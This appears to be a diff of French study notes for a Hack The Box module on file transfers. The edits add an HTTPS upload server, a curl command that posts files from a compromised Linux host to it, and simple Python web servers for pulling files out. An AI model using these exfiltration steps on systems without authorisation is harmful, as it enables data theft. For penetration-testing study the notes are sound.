@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-04-20T16:33:31.153Z
+date: 2025-04-20T16:38:38.163Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -434,7 +434,12 @@ Comme vu dans la partie Windows, il est possible d'utiliser l'extension du modul
 Télécharger et installer le module python:
 
 ```
-sudo python3 -m pip install --user uploadserver
+python3 -m pip install --user uploadserver
+```
+
+Se rendre dans le répertoire dédié à l'envoi.
+```
+mkdir https && cd https
 ```
 
 Générer un certificat auto-signé.
@@ -446,6 +451,29 @@ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sh
 Démarrer le serveur web:
 
 ```
-python3 -m uploadserver
+python3 -m uploadserver 443 --server-certificate ./server.pem
 ```
+
+Envoyer des fichiers vers le serveur.
+
+```
+curl -X POST https://<adresse>/upload -F 'files=@<fichier>' --insecure
+```
+
+### Alternative Web File Transfer Method
+
+Comme les distributions Linux ont souvent Python ou PHP installés, démarrer un serveur web pour transférer des fichiers est simple. Si le serveur compromis est déjà un serveur web, on peut déplacer les fichiers souhaités dans le répertoire web et y accéder via une page web.
+
+Il est possible de lancer un serveur web avec plusieurs langages. Si la machine compromise n'a pas de serveur web installé, on peut utiliser un mini serveur web. Bien qu'ils soient moins sécurisés, ils offrent une grande flexibilité, notamment pour changer rapidement le dossier racine (webroot) et le port d'écoute.
+
+Créer un serveur web avec Python3
+```
+python3 -m http.server
+```
+
+Créer un serveur web avec Python 2.7
+```
+python2.7 -m SimpleHTTPServer
+```
+
 
